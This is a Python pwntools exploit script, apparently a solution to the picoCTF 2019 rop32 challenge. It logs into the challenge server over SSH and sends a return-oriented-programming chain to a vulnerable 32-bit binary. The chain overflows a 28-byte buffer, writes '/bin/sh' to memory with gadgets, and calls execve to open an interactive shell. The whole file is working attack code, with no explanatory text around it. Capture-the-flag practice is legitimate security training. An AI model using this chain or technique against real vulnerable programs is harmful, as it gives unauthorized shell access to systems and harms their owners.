#!/usr/bin/env python3
from pwn import *
context(arch='i386', kernel='i386', terminal=['tmux', 'neww'])

remote = ssh('afcidk', '2019shell1.picoctf.com', password="pass....")
remote.set_working_directory(
    b'/problems/rop32_2_8cd220e3284b3f110fe852cc6ec9e564')

r = remote.process('./vuln')
rop = ROP('./vuln')
e = ELF('./vuln')
eax = 11  # execev
# 0x807c2da mov dword ptr [eax], edx ; pop ebx ; pop esi ; pop edi ; ret
writable_addr = 0x80dc000
mov_edx_peax = 0x807c2da
mov_edx_eax = 0x80647f8
pop_edx = 0x80ce585
pop_eabsd = 0x809f46a
pop_edcb = 0x806ee91
int_0x80 = rop.find_gadget(['int 0x80'])[0]

# Offset
payload = cyclic(28)
# Write "/bin/sh" to writable address
payload += p32(pop_edx) + p32(writable_addr)
payload += p32(mov_edx_eax)
payload += p32(pop_edx) + b'/bin'
payload += p32(mov_edx_peax) + p32(1) * 3

payload += p32(pop_edx) + p32(writable_addr + 4)
payload += p32(mov_edx_eax)
payload += p32(pop_edx) + b'/sh\x00'
payload += p32(mov_edx_peax) + p32(1) * 3

# execev(ebx, ecx, edx) = execve(writable, 0, 0)
payload += p32(pop_eabsd) + p32(eax) + p32(writable_addr) + p32(0) * 2
payload += p32(pop_edcb) + p32(0) + p32(0) + p32(writable_addr)
payload += p32(int_0x80)

r.sendline(payload)
r.interactive()
